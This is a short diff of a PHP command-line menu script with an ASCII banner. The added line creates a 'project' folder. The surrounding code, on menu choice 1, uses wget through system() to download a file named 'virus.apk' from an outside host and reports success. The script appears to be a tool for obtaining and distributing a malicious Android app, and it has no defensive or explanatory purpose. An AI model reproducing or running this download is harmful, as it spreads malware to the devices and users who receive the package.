@@ -52,6 +52,7 @@ Y8    8P 88    88 88      8P
         $in = trim(fgets(STDIN));
         
         if($in == 1 || $in == 01){
+            system("mkdir project");
             system("cd project");
             system("wget http://upfile.rf.gd/apkproject/myapk/virus.apk");
             echo "\033[92mDownload Success ^_^\n";
